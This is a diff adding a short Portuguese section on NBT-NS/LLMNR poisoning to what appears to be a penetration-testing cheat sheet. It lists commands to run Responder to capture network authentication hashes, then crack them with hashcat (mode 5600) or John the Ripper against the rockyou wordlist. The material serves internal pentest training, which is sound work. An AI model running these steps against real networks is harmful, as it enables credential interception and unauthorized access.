@@ -291,6 +291,26 @@ Executando comando de forma direta
 
 ## Ataque: NBT-NS / LLMNR
 
+*Obs: O ataque se baseia em a maquina do atacante esta ouvindo as requições da rede e se passar um servidor valido e assim receber informações sigilosas.*
+
+Aplicação que habilita a maquina para responder requisições
+
+`responder`
+
+Identificando a hash capturada
+
+`hash id ...HASH..`
+
+Quebrando a hash
+
+`hashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt`
+
+ou 
+
+`john hashes --wordlist=/usr/share/wordlists/rockyou.txt`
+
+*Obs: Ferramenta indispensavel para pentest interno.*
+
 
 
 
